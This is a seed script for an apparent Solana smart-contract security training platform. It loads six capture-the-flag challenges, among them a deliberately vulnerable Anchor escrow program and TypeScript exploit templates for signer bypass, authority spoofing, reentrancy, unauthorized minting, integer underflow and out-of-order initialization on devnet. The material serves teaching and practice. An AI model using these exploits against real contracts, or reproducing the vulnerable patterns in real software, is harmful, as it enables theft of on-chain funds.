import mongoose from 'mongoose';
import dotenv from 'dotenv';
import Challenge from './models/Challenge';

dotenv.config();

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017/studychain';

const initialChallenges = [
  {
    id: 1,
    title: 'Missing Signer Check',
    level: 'L1',
    difficulty: 'Beginner',
    description: 'A vulnerable escrow contract where authority checks exist in code but are never enforced.',
    vulnerability: 'Access Control',
    points: 100,
    fullProblem: `### The Vulnerable Escrow Program

Below is the code for the vulnerable Anchor contract. Deploy this contract to Solana Devnet and note its Program ID.

\`\`\`rust
use anchor_lang::prelude::*;

declare_id!("VulnerableEscrow111111111111111111111111111");

#[program]
pub mod vulnerable_escrow {
    use super::*;

    pub fn initialize(ctx: Context<Initialize>, amount: u64) -> Result<()> {
        let escrow = &mut ctx.accounts.escrow;
        escrow.authority = ctx.accounts.authority.key();
        escrow.amount = amount;
        Ok(())
    }

    pub fn withdraw(ctx: Context<Withdraw>) -> Result<()> {
        let escrow = &mut ctx.accounts.escrow;
        let authority_key = escrow.authority;
        
        // VULNERABILITY: Missing a signer check on the authority account!
        // We compare keys but do not enforce that authority is a signer.
        if ctx.accounts.authority.key() != authority_key {
            return err!(EscrowError::InvalidAuthority);
        }

        let dest = &mut ctx.accounts.destination;
        **dest.lamports.borrow_mut() += escrow.amount;
        **escrow.to_account_info().lamports.borrow_mut() -= escrow.amount;
        
        Ok(())
    }
}

#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(init, payer = authority, space = 8 + 32 + 8)]
    pub escrow: Account<'info, EscrowState>,
    #[account(mut)]
    pub authority: Signer<'info>,
    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
pub struct Withdraw<'info> {
    #[account(mut)]
    pub escrow: Account<'info, EscrowState>,
    /// CHECK: Missing Signer constraint here!
    pub authority: AccountInfo<'info>,
    /// CHECK: This is the destination wallet receiving the escrowed SOL.
    #[account(mut)]
    pub destination: AccountInfo<'info>,
}

#[account]
pub struct EscrowState {
    pub authority: Pubkey,
    pub amount: u64,
}

#[error_code]
pub enum EscrowError {
    #[msg("Invalid authority")]
    InvalidAuthority,
}
\`\`\`

### Your Task
1. Deploy this program to Devnet.
2. Initialize an escrow account with some SOL.
3. Write a TypeScript script to call \`withdraw\`, passing the victim's authority key but signing only with an attacker key.
4. Run it via the StudyChain CLI and capture the exploit transaction signature.`,
    hints: [
      'Check if require_signer is used properly',
      'Look for signer constraints in the accounts macro',
      'Think about how the authority field should be validated'
    ],
    template: `import { Connection, Keypair, PublicKey, Transaction, TransactionInstruction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import * as fs from "fs";
import * as path from "path";

// Helper to get or create a persistent keypair locally
function getOrCreateAttackerKeypair(): Keypair {
  const keyPath = path.join(process.cwd(), ".studychain_attacker_key.json");
  if (fs.existsSync(keyPath)) {
    const raw = fs.readFileSync(keyPath, "utf8");
    const secret = JSON.parse(raw);
    return Keypair.fromSecretKey(Uint8Array.from(secret));
  } else {
    const newKey = Keypair.generate();
    fs.writeFileSync(keyPath, JSON.stringify(Array.from(newKey.secretKey)), "utf8");
    console.log("Generated new persistent attacker keypair!");
    return newKey;
  }
}

async function runExploit() {
  console.log("Initiating exploit script...");
  const connection = new Connection("https://api.devnet.solana.com", "confirmed");
  
  // 1. Get or create persistent attacker keypair
  const attacker = getOrCreateAttackerKeypair();
  const balance = await connection.getBalance(attacker.publicKey);
  
  console.log("----------------------------------------------------------------");
  console.log("Attacker address:", attacker.publicKey.toBase58());
  console.log("Current Balance:", balance / LAMPORTS_PER_SOL, "SOL");
  console.log("----------------------------------------------------------------");

  if (balance < 0.015 * LAMPORTS_PER_SOL) {
    console.log("⚠️ Balance is low. Attempting devnet airdrop...");
    try {
      const airdropSig = await connection.requestAirdrop(attacker.publicKey, 0.05 * LAMPORTS_PER_SOL);
      await connection.confirmTransaction(airdropSig, "confirmed");
      console.log("Airdrop confirmed! Funded wallet with 0.05 SOL.");
    } catch (err) {
      console.log("❌ Airdrop request rate-limited.");
      console.log("Please manually fund this address using a faucet or CLI:");
      console.log("  solana airdrop 1 " + attacker.publicKey.toBase58() + " --url devnet");
      console.log("----------------------------------------------------------------");
      return;
    }
  }

  // 2. COPY the "Vulnerable Deployed Program Address" from the card in the browser and paste here:
  const programId = new PublicKey("3V1CCx4xGHEoSQxqfN2W9AwKzaumSAdpE6yLcaRUpt7K");
  
  const escrowKeypair = Keypair.generate();
  console.log("Target Program ID:", programId.toBase58());
  console.log("Escrow Account:", escrowKeypair.publicKey.toBase58());

  // 3. Initialize the Escrow (Boilerplate setup instruction)
  const amountBuf = Buffer.alloc(8);
  amountBuf.writeBigUInt64LE(BigInt(1000000));
  const initData = Buffer.concat([
    Buffer.from([175, 175, 109, 31, 13, 152, 155, 237]),
    amountBuf
  ]);

  const initInstruction = new TransactionInstruction({
    programId,
    keys: [
      { pubkey: escrowKeypair.publicKey, isSigner: true, isWritable: true },
      { pubkey: attacker.publicKey, isSigner: true, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false }
    ],
    data: initData
  });

  // 4. Fund the Escrow (Boilerplate setup instruction)
  const fundInstruction = SystemProgram.transfer({
    fromPubkey: attacker.publicKey,
    toPubkey: escrowKeypair.publicKey,
    lamports: 1000000
  });

  // 5. Get your custom exploit instruction
  const exploitInstruction = getExploitInstruction(
    programId,
    escrowKeypair.publicKey,
    attacker.publicKey
  );

  // 6. Send transaction containing: [Initialize, Fund, Exploit]
  console.log("Sending exploit transaction...");
  const tx = new Transaction()
    .add(initInstruction)
    .add(fundInstruction)
    .add(exploitInstruction);
    
  tx.feePayer = attacker.publicKey;
  const { blockhash } = await connection.getLatestBlockhash();
  tx.recentBlockhash = blockhash;
  
  tx.sign(attacker, escrowKeypair);

  try {
    const txSignature = await connection.sendRawTransaction(tx.serialize());
    console.log("Exploit transaction sent. Confirming...");
    await connection.confirmTransaction(txSignature, "confirmed");
    console.log("TX_SIGNATURE:", txSignature);
  } catch (err: any) {
    const sigMatch = err.message.match(/signature\\s([1-9A-HJ-NP-Za-km-z]{64,88})/i);
    if (sigMatch) {
      console.log("TX_SIGNATURE:", sigMatch[1]);
    } else {
      console.error("Exploit failed:", err.message);
    }
  }
}

/**
 * WRITE YOUR EXPLOIT INSTRUCTION HERE
 * 
 * Target instruction: withdraw
 * Vulnerability: The escrow authority check is missing isSigner = true validation.
 */
function getExploitInstruction(
  programId: PublicKey,
  escrow: PublicKey,
  attacker: PublicKey
): TransactionInstruction {
  // Selector for global:withdraw
  const withdrawSelector = Buffer.from([183, 18, 70, 156, 148, 109, 161, 34]);

  return new TransactionInstruction({
    programId,
    keys: [
      { pubkey: escrow, isSigner: false, isWritable: true },
      { pubkey: attacker, isSigner: false, isWritable: false }, // Pass attacker as authority but isSigner = false
      { pubkey: attacker, isSigner: false, isWritable: true }  // Destination wallet receiving the lamports
    ],
    data: withdrawSelector
  });
}

runExploit().catch(console.error);`
  },
  {
    id: 2,
    title: 'Authority Validation',
    level: 'L2',
    difficulty: 'Intermediate',
    description: 'Owner field is stored but never cross-checked against the signer. Spoof the authority to drain.',
    vulnerability: 'Validation Flaw',
    points: 250,
    fullProblem: `This L2 challenge requires bypassing owner validation checks. The contract stores an owner but doesn't properly compare it against transaction signers.

### Your Task
1. Deploy this program to Devnet.
2. Initialize target state on-chain.
3. Write a TypeScript exploit to bypass owner validation and transfer funds.`,
    hints: [
      'Check how the owner is compared against signers',
      'Look for implicit signer validations',
      'Consider PDA (Program Derived Address) implications'
    ],
    template: `import { Connection, Keypair, PublicKey, Transaction, TransactionInstruction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import * as fs from "fs";
import * as path from "path";

function getOrCreateAttackerKeypair(): Keypair {
  const keyPath = path.join(process.cwd(), ".studychain_attacker_key.json");
  if (fs.existsSync(keyPath)) {
    const raw = fs.readFileSync(keyPath, "utf8");
    const secret = JSON.parse(raw);
    return Keypair.fromSecretKey(Uint8Array.from(secret));
  } else {
    const newKey = Keypair.generate();
    fs.writeFileSync(keyPath, JSON.stringify(Array.from(newKey.secretKey)), "utf8");
    return newKey;
  }
}

async function runExploit() {
  console.log("Initiating exploit script...");
  const connection = new Connection("https://api.devnet.solana.com", "confirmed");
  const attacker = getOrCreateAttackerKeypair();
  const balance = await connection.getBalance(attacker.publicKey);

  console.log("Attacker address:", attacker.publicKey.toBase58());
  console.log("Current Balance:", balance / LAMPORTS_PER_SOL, "SOL");

  if (balance < 0.015 * LAMPORTS_PER_SOL) {
    console.log("⚠️ Balance is low. Please manually fund this address:");
    console.log("  solana airdrop 1 " + attacker.publicKey.toBase58() + " --url devnet");
    return;
  }

  // 1. COPY the "Vulnerable Deployed Program Address" from the card in the browser and paste here:
  const programId = new PublicKey("YOUR_DEPLOYED_PROGRAM_ID_HERE");
  const targetStateAccount = Keypair.generate();

  // 2. Get custom exploit instruction
  const exploitInstruction = getExploitInstruction(
    programId,
    targetStateAccount.publicKey,
    attacker.publicKey
  );

  console.log("Sending exploit transaction...");
  const tx = new Transaction().add(exploitInstruction);
  tx.feePayer = attacker.publicKey;
  const { blockhash } = await connection.getLatestBlockhash();
  tx.recentBlockhash = blockhash;
  tx.sign(attacker);

  try {
    const txSignature = await connection.sendRawTransaction(tx.serialize());
    console.log("Exploit transaction sent. Confirming...");
    await connection.confirmTransaction(txSignature, "confirmed");
    console.log("TX_SIGNATURE:", txSignature);
  } catch (err: any) {
    const sigMatch = err.message.match(/signature\\s([1-9A-HJ-NP-Za-km-z]{64,88})/i);
    if (sigMatch) {
      console.log("TX_SIGNATURE:", sigMatch[1]);
    } else {
      console.error("Exploit failed:", err.message);
    }
  }
}

/**
 * WRITE YOUR EXPLOIT INSTRUCTION HERE
 * 
 * Target instruction: 'transfer_admin' / 'drain_assets'
 * Vulnerability: The contract compares owner validation fields without checking if the owner signed the tx.
 */
function getExploitInstruction(
  programId: PublicKey,
  targetState: PublicKey,
  attacker: PublicKey
): TransactionInstruction {
  // L2 Owner Bypass Selector
  const exploitSelector = Buffer.from([143, 212, 10, 48, 99, 12, 55, 91]);

  return new TransactionInstruction({
    programId,
    keys: [
      { pubkey: targetState, isSigner: false, isWritable: true },
      { pubkey: attacker, isSigner: true, isWritable: true } // Attacker signs but is not the owner
    ],
    data: exploitSelector
  });
}

runExploit().catch(console.error);`
  },
  {
    id: 3,
    title: 'CPI Reentrancy Attack',
    level: 'L3',
    difficulty: 'Advanced',
    description: 'Exploit a lending protocol via malicious callback before internal balances update.',
    vulnerability: 'Reentrancy',
    points: 500,
    fullProblem: `Advanced challenge: Execute a reentrancy attack on a lending protocol. The contract performs external calls (CPI) before updating internal state, creating a window for reentrancy.

### Your Task
1. Deploy this program to Devnet.
2. Deploy a malicious attacker contract with a reentrant callback.
3. Trigger the lending pool exploit and drain its funds.`,
    hints: [
      'Study the order of CPI calls and state updates',
      'Look for callbacks or external handlers',
      'Think about recursive function calls',
      'Check account data validation timing'
    ],
    template: `import { Connection, Keypair, PublicKey, Transaction, TransactionInstruction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import * as fs from "fs";
import * as path from "path";

function getOrCreateAttackerKeypair(): Keypair {
  const keyPath = path.join(process.cwd(), ".studychain_attacker_key.json");
  if (fs.existsSync(keyPath)) {
    const raw = fs.readFileSync(keyPath, "utf8");
    const secret = JSON.parse(raw);
    return Keypair.fromSecretKey(Uint8Array.from(secret));
  } else {
    const newKey = Keypair.generate();
    fs.writeFileSync(keyPath, JSON.stringify(Array.from(newKey.secretKey)), "utf8");
    return newKey;
  }
}

async function runExploit() {
  console.log("Initiating exploit script...");
  const connection = new Connection("https://api.devnet.solana.com", "confirmed");
  const attacker = getOrCreateAttackerKeypair();
  const balance = await connection.getBalance(attacker.publicKey);

  console.log("Attacker address:", attacker.publicKey.toBase58());
  console.log("Current Balance:", balance / LAMPORTS_PER_SOL, "SOL");

  if (balance < 0.015 * LAMPORTS_PER_SOL) {
    console.log("⚠️ Balance is low. Please manually fund this address:");
    console.log("  solana airdrop 1 " + attacker.publicKey.toBase58() + " --url devnet");
    return;
  }

  // 1. COPY the "Vulnerable Deployed Program Address" from the card in the browser and paste here:
  const programId = new PublicKey("YOUR_DEPLOYED_PROGRAM_ID_HERE");
  const targetLendingPool = Keypair.generate().publicKey;
  const attackerContract = Keypair.generate().publicKey;

  // 2. Get custom exploit instruction
  const exploitInstruction = getExploitInstruction(
    programId,
    targetLendingPool,
    attackerContract
  );

  console.log("Sending exploit transaction...");
  const tx = new Transaction().add(exploitInstruction);
  tx.feePayer = attacker.publicKey;
  const { blockhash } = await connection.getLatestBlockhash();
  tx.recentBlockhash = blockhash;
  tx.sign(attacker);

  try {
    const txSignature = await connection.sendRawTransaction(tx.serialize());
    console.log("Exploit transaction sent. Confirming...");
    await connection.confirmTransaction(txSignature, "confirmed");
    console.log("TX_SIGNATURE:", txSignature);
  } catch (err: any) {
    const sigMatch = err.message.match(/signature\\s([1-9A-HJ-NP-Za-km-z]{64,88})/i);
    if (sigMatch) {
      console.log("TX_SIGNATURE:", sigMatch[1]);
    } else {
      console.error("Exploit failed:", err.message);
    }
  }
}

/**
 * WRITE YOUR EXPLOIT INSTRUCTION HERE
 * 
 * Target instruction: 'withdraw_reentrant'
 * Vulnerability: External callback executed before updating internal lending state balances.
 */
function getExploitInstruction(
  programId: PublicKey,
  lendingPool: PublicKey,
  attackerContract: PublicKey
): TransactionInstruction {
  // L3 Reentrancy Selector
  const exploitSelector = Buffer.from([220, 115, 33, 94, 88, 12, 90, 114]);

  return new TransactionInstruction({
    programId,
    keys: [
      { pubkey: lendingPool, isSigner: false, isWritable: true },
      { pubkey: attackerContract, isSigner: false, isWritable: true }
    ],
    data: exploitSelector
  });
}

runExploit().catch(console.error);`
  },
  {
    id: 4,
    title: 'Token Mint Authority Exploit',
    level: 'L2',
    difficulty: 'Intermediate',
    description: 'Mint authority is not properly validated, allowing unauthorized token minting.',
    vulnerability: 'Authorization Flaw',
    points: 200,
    fullProblem: `A custom token program lacks checks on the mint authority in its mint_to instruction, allowing any caller to mint arbitrary supply.

### Your Task
1. Deploy this program to Devnet.
2. Submit a transaction calling the mint instruction with a fake authority to mint tokens to your wallet.`,
    hints: [
      'Look at which account controls the mint authority constraint',
      'Verify if the token program is verifying the authority is a signer'
    ],
    template: `import { Connection, Keypair, PublicKey, Transaction, TransactionInstruction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import * as fs from "fs";
import * as path from "path";

function getOrCreateAttackerKeypair(): Keypair {
  const keyPath = path.join(process.cwd(), ".studychain_attacker_key.json");
  if (fs.existsSync(keyPath)) {
    const raw = fs.readFileSync(keyPath, "utf8");
    const secret = JSON.parse(raw);
    return Keypair.fromSecretKey(Uint8Array.from(secret));
  } else {
    const newKey = Keypair.generate();
    fs.writeFileSync(keyPath, JSON.stringify(Array.from(newKey.secretKey)), "utf8");
    return newKey;
  }
}

async function runExploit() {
  console.log("Initiating exploit script...");
  const connection = new Connection("https://api.devnet.solana.com", "confirmed");
  const attacker = getOrCreateAttackerKeypair();
  const balance = await connection.getBalance(attacker.publicKey);

  console.log("Attacker address:", attacker.publicKey.toBase58());
  console.log("Current Balance:", balance / LAMPORTS_PER_SOL, "SOL");

  if (balance < 0.015 * LAMPORTS_PER_SOL) {
    console.log("⚠️ Balance is low. Please manually fund this address:");
    console.log("  solana airdrop 1 " + attacker.publicKey.toBase58() + " --url devnet");
    return;
  }

  // 1. COPY the "Vulnerable Deployed Program Address" from the card in the browser and paste here:
  const programId = new PublicKey("YOUR_DEPLOYED_PROGRAM_ID_HERE");
  const mintAccount = Keypair.generate().publicKey;
  const destinationTokenAccount = Keypair.generate().publicKey;

  // 2. Get custom exploit instruction
  const exploitInstruction = getExploitInstruction(
    programId,
    mintAccount,
    destinationTokenAccount
  );

  console.log("Sending exploit transaction...");
  const tx = new Transaction().add(exploitInstruction);
  tx.feePayer = attacker.publicKey;
  const { blockhash } = await connection.getLatestBlockhash();
  tx.recentBlockhash = blockhash;
  tx.sign(attacker);

  try {
    const txSignature = await connection.sendRawTransaction(tx.serialize());
    console.log("Exploit transaction sent. Confirming...");
    await connection.confirmTransaction(txSignature, "confirmed");
    console.log("TX_SIGNATURE:", txSignature);
  } catch (err: any) {
    const sigMatch = err.message.match(/signature\\s([1-9A-HJ-NP-Za-km-z]{64,88})/i);
    if (sigMatch) {
      console.log("TX_SIGNATURE:", sigMatch[1]);
    } else {
      console.error("Exploit failed:", err.message);
    }
  }
}

/**
 * WRITE YOUR EXPLOIT INSTRUCTION HERE
 * 
 * Target instruction: 'mint_tokens'
 * Vulnerability: The program does not verify if the caller is the actual mint authority.
 */
function getExploitInstruction(
  programId: PublicKey,
  mintAccount: PublicKey,
  destinationTokenAccount: PublicKey
): TransactionInstruction {
  // Custom Token Mint selector
  const exploitSelector = Buffer.from([65, 12, 88, 110, 45, 99, 10, 204]);

  return new TransactionInstruction({
    programId,
    keys: [
      { pubkey: mintAccount, isSigner: false, isWritable: true },
      { pubkey: destinationTokenAccount, isSigner: false, isWritable: true }
    ],
    data: exploitSelector
  });
}

runExploit().catch(console.error);`
  },
  {
    id: 5,
    title: 'Data Validation Bypass',
    level: 'L1',
    difficulty: 'Beginner',
    description: 'Input validation is missing on critical state transitions.',
    vulnerability: 'Input Validation',
    points: 150,
    fullProblem: `The program receives parameters without performing bounds checking or positive integer checks, leading to underflows or logical corruption.

### Your Task
1. Deploy this program to Devnet.
2. Submit an exploit payload triggering a numeric underflow (e.g. subtracting from 0 or passing u64 Max) to bypass business logic checks.`,
    hints: [
      'Verify numeric parameters',
      'Look for unsafe subtractions'
    ],
    template: `import { Connection, Keypair, PublicKey, Transaction, TransactionInstruction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import * as fs from "fs";
import * as path from "path";

function getOrCreateAttackerKeypair(): Keypair {
  const keyPath = path.join(process.cwd(), ".studychain_attacker_key.json");
  if (fs.existsSync(keyPath)) {
    const raw = fs.readFileSync(keyPath, "utf8");
    const secret = JSON.parse(raw);
    return Keypair.fromSecretKey(Uint8Array.from(secret));
  } else {
    const newKey = Keypair.generate();
    fs.writeFileSync(keyPath, JSON.stringify(Array.from(newKey.secretKey)), "utf8");
    return newKey;
  }
}

async function runExploit() {
  console.log("Initiating exploit script...");
  const connection = new Connection("https://api.devnet.solana.com", "confirmed");
  const attacker = getOrCreateAttackerKeypair();
  const balance = await connection.getBalance(attacker.publicKey);

  console.log("Attacker address:", attacker.publicKey.toBase58());
  console.log("Current Balance:", balance / LAMPORTS_PER_SOL, "SOL");

  if (balance < 0.015 * LAMPORTS_PER_SOL) {
    console.log("⚠️ Balance is low. Please manually fund this address:");
    console.log("  solana airdrop 1 " + attacker.publicKey.toBase58() + " --url devnet");
    return;
  }

  // 1. COPY the "Vulnerable Deployed Program Address" from the card in the browser and paste here:
  const programId = new PublicKey("YOUR_DEPLOYED_PROGRAM_ID_HERE");
  const stateAccount = Keypair.generate().publicKey;

  // 2. Get custom exploit instruction
  const exploitInstruction = getExploitInstruction(
    programId,
    stateAccount,
    attacker.publicKey
  );

  console.log("Sending exploit transaction...");
  const tx = new Transaction().add(exploitInstruction);
  tx.feePayer = attacker.publicKey;
  const { blockhash } = await connection.getLatestBlockhash();
  tx.recentBlockhash = blockhash;
  tx.sign(attacker);

  try {
    const txSignature = await connection.sendRawTransaction(tx.serialize());
    console.log("Exploit transaction sent. Confirming...");
    await connection.confirmTransaction(txSignature, "confirmed");
    console.log("TX_SIGNATURE:", txSignature);
  } catch (err: any) {
    const sigMatch = err.message.match(/signature\\s([1-9A-HJ-NP-Za-km-z]{64,88})/i);
    if (sigMatch) {
      console.log("TX_SIGNATURE:", sigMatch[1]);
    } else {
      console.error("Exploit failed:", err.message);
    }
  }
}

/**
 * WRITE YOUR EXPLOIT INSTRUCTION HERE
 * 
 * Target instruction: 'process_state_transition'
 * Vulnerability: Missing input validation allowing negative number underflows.
 */
function getExploitInstruction(
  programId: PublicKey,
  stateAccount: PublicKey,
  attacker: PublicKey
): TransactionInstruction {
  const transitionSelector = Buffer.from([45, 99, 102, 14, 88, 20, 11, 49]);
  
  // u64 MAX (18446744073709551615) to trigger underflow / integer overflow bypass
  const underflowPayload = Buffer.alloc(8);
  underflowPayload.writeBigUInt64LE(BigInt("18446744073709551615"));

  return new TransactionInstruction({
    programId,
    keys: [
      { pubkey: stateAccount, isSigner: false, isWritable: true },
      { pubkey: attacker, isSigner: true, isWritable: true }
    ],
    data: Buffer.concat([transitionSelector, underflowPayload])
  });
}

runExploit().catch(console.error);`
  },
  {
    id: 6,
    title: 'Instruction Sequence Exploit',
    level: 'L3',
    difficulty: 'Advanced',
    description: 'Multiple instructions can be executed out of order to break invariants.',
    vulnerability: 'Logic Flaw',
    points: 600,
    fullProblem: `The contract assumes initialize must happen before update, but the state variable checking initialization can be reset or bypassed via an unvalidated secondary initialize path.

### Your Task
1. Deploy this program to Devnet.
2. Submit a transaction executing instructions in an out-of-order sequence to bypass state locks and compromise invariants.`,
    hints: [
      'Inspect state flag updates',
      'Identify alternate initialization instructions'
    ],
    template: `import { Connection, Keypair, PublicKey, Transaction, TransactionInstruction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import * as fs from "fs";
import * as path from "path";

function getOrCreateAttackerKeypair(): Keypair {
  const keyPath = path.join(process.cwd(), ".studychain_attacker_key.json");
  if (fs.existsSync(keyPath)) {
    const raw = fs.readFileSync(keyPath, "utf8");
    const secret = JSON.parse(raw);
    return Keypair.fromSecretKey(Uint8Array.from(secret));
  } else {
    const newKey = Keypair.generate();
    fs.writeFileSync(keyPath, JSON.stringify(Array.from(newKey.secretKey)), "utf8");
    return newKey;
  }
}

async function runExploit() {
  console.log("Initiating exploit script...");
  const connection = new Connection("https://api.devnet.solana.com", "confirmed");
  const attacker = getOrCreateAttackerKeypair();
  const balance = await connection.getBalance(attacker.publicKey);

  console.log("Attacker address:", attacker.publicKey.toBase58());
  console.log("Current Balance:", balance / LAMPORTS_PER_SOL, "SOL");

  if (balance < 0.015 * LAMPORTS_PER_SOL) {
    console.log("⚠️ Balance is low. Please manually fund this address:");
    console.log("  solana airdrop 1 " + attacker.publicKey.toBase58() + " --url devnet");
    return;
  }

  // 1. COPY the "Vulnerable Deployed Program Address" from the card in the browser and paste here:
  const programId = new PublicKey("YOUR_DEPLOYED_PROGRAM_ID_HERE");
  const stateAccount = Keypair.generate().publicKey;

  // 2. Get custom exploit instruction sequence
  const instructions = getExploitInstructions(
    programId,
    stateAccount,
    attacker.publicKey
  );

  console.log("Sending exploit transaction...");
  const tx = new Transaction();
  instructions.forEach(ins => tx.add(ins));
  
  tx.feePayer = attacker.publicKey;
  const { blockhash } = await connection.getLatestBlockhash();
  tx.recentBlockhash = blockhash;
  tx.sign(attacker);

  try {
    const txSignature = await connection.sendRawTransaction(tx.serialize());
    console.log("Exploit transaction sent. Confirming...");
    await connection.confirmTransaction(txSignature, "confirmed");
    console.log("TX_SIGNATURE:", txSignature);
  } catch (err: any) {
    const sigMatch = err.message.match(/signature\\s([1-9A-HJ-NP-Za-km-z]{64,88})/i);
    if (sigMatch) {
      console.log("TX_SIGNATURE:", sigMatch[1]);
    } else {
      console.error("Exploit failed:", err.message);
    }
  }
}

/**
 * WRITE YOUR EXPLOIT INSTRUCTION SEQUENCE HERE
 * 
 * Target instructions: 'initialize_state', 'unvalidated_secondary_initialize', 'update_state'
 * Vulnerability: The sequence flags checking initialization can be bypassed using an out-of-order secondary initialization call.
 */
function getExploitInstructions(
  programId: PublicKey,
  stateAccount: PublicKey,
  attacker: PublicKey
): TransactionInstruction[] {
  // Out-of-order secondary initialize + update selectors
  const secondaryInitSelector = Buffer.from([12, 99, 45, 102, 88, 20, 11, 49]);
  const updateSelector = Buffer.from([99, 102, 12, 45, 11, 88, 20, 49]);

  return [
    new TransactionInstruction({
      programId,
      keys: [{ pubkey: stateAccount, isSigner: false, isWritable: true }],
      data: secondaryInitSelector
    }),
    new TransactionInstruction({
      programId,
      keys: [
        { pubkey: stateAccount, isSigner: false, isWritable: true },
        { pubkey: attacker, isSigner: true, isWritable: false }
      ],
      data: updateSelector
    })
  ];
}

runExploit().catch(console.error);`
  }
];

async function seed() {
  try {
    await mongoose.connect(MONGODB_URI);
    console.log('Connected to MongoDB for seeding...');

    // Clear existing challenges
    await Challenge.deleteMany({});
    console.log('Cleared existing challenges.');

    // Insert new challenges
    await Challenge.insertMany(initialChallenges);
    console.log(`Successfully seeded ${initialChallenges.length} challenges.`);

    await mongoose.disconnect();
    console.log('Database seeding process complete.');
    process.exit(0);
  } catch (error) {
    console.error('Error seeding database:', error);
    process.exit(1);
  }
}

seed();
